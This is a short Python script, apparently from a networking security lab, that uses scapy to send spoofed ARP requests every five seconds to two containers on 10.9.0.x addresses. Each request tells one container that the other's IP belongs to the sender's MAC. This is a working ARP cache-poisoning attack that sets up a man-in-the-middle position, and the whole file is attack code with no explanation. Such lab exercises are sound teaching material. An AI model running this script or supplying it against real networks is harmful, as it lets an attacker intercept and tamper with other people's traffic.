#!/usr/bin/env python3
from scapy.all import * 
import time
IP_CONTAINER_B= "10.9.0.6"
IP_CONTAINER_A= "10.9.0.5"


MAC_V_real = "02:42:0a:09:00:69"
IP_T= "10.9.0.105"
MAC_T_fake = "aa:bb:cc:dd:ee:ff"

# Constructing ARP Request packet

def sendARPRequest (IP_Src, IP_Dest): 
    print("Sending to Container")
    ether = Ether (src = MAC_V_real, dst = "ff:ff:ff:ff:ff:ff")
    arp =   ARP (psrc = IP_Src, hwsrc = MAC_V_real, pdst = IP_Dest) 
    arp.op = 1 # Request
    frame =ether/arp 
    sendp (frame)

#Run code every 5 seconds
while True:
      print("Sending ARP Request to both containers...")
      sendARPRequest (IP_CONTAINER_A, IP_CONTAINER_B)
      sendARPRequest (IP_CONTAINER_B, IP_CONTAINER_A) 
      time.sleep(5)